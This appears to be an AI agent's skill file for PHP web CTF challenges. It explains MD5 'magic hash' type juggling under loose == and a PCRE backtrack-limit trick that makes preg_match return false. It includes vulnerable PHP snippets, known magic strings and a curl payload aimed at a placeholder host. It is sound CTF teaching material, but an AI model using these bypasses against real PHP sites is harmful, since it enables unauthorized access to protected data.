---
name: php-magic-hash-pcre-redos
description: "Use for PHP web CTFs: magic hash + PCRE ReDoS bypass."
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [web, php, ctf, magic-hash, type-juggling, pcre, redos, backtrack]
---

# PHP Magic Hash + PCRE Backtrack-Limit Bypass

Use when a PHP web challenge compares `md5(...) == $hash` (loose `==`) or gates
a flag behind `preg_match("/^(.*?)+$/s", ...)` style regexes. Proven on EQCTF
"Sourceful Egg" (100, Easy): both tricks in one `index.php`.

## Trick 1: MD5 magic hash (type juggling)

```php
if (md5($_GET['x']) == '00e39786989574093743872279278460') { ... }
```
`==` with two **numeric strings** casts both to float. A hash like
`0e462097431906509019562988736854` is scientific notation = `0.0`, so any two
`0e`-prefixed hashes compare equal.

Known magic strings and their `0e...` md5s:
- `240610708` -> `0e462097431906509019562988736854` (the classic)
- `QNKCDZO` -> `0e830400451993494058024219903391`
- `aabg7XSs`, `aabC9RqS`, `s878926199a`, `s155964671a`, etc. (full list online)

**PHP 8 note:** the trick still works when BOTH operands are numeric strings
(`"0e4620..." == "0e3978..."`). It breaks only when one side is a non-numeric
string (e.g. comparing against `"hash"` or a real UUID-style string).

## Trick 2: PCRE catastrophic backtracking -> preg_match returns false

```php
if (preg_match("/^(.*?)+$/s", $egg)) { denied(); } else { give_flag(); }
```
`^(.*?)+$` is exponential on long inputs. When the input length pushes past
`pcre.backtrack_limit` (default 1,000,000), `preg_match` returns **false**
(error), which is falsy — the else branch runs. In practice ~50,000 `a`s is
enough (5,000 was not); longer is safer.

```bash
curl "http://HOST/?eggSecret=240610708" \
     --data-urlencode "egg=$(python3 -c "print('a'*50000)")"
```

## Pitfalls
- Keep the big payload in the POST **body**. `curl -G` (or
  `--data-urlencode` on the URL) puts it in the query string -> Apache
  `414 Request-URI Too Long` (or nginx 414).
- POST param must be named exactly as the source expects (`egg`), and the GET
  param (`eggSecret`) goes in the URL — mix them up and you hit the "you're not
  even touching the egg" outer branch.
- Verify the magic hash locally first: `php -r "var_dump(md5('240610708') == '00e39786989574093743872279278460');"`
  (needs the target hash). Or replicate in python with `int()` float casting.
- If the regex `preg_match` result is compared with `===` (strict), the false
  return still wins (false !== truthy branch) — same bypass.
- Always read the full source first: the flag may also be reachable via the
  `example.conf`/`.htaccess` blocklist (here `flag.txt` was denied for direct
  web access, forcing the PHP code path).
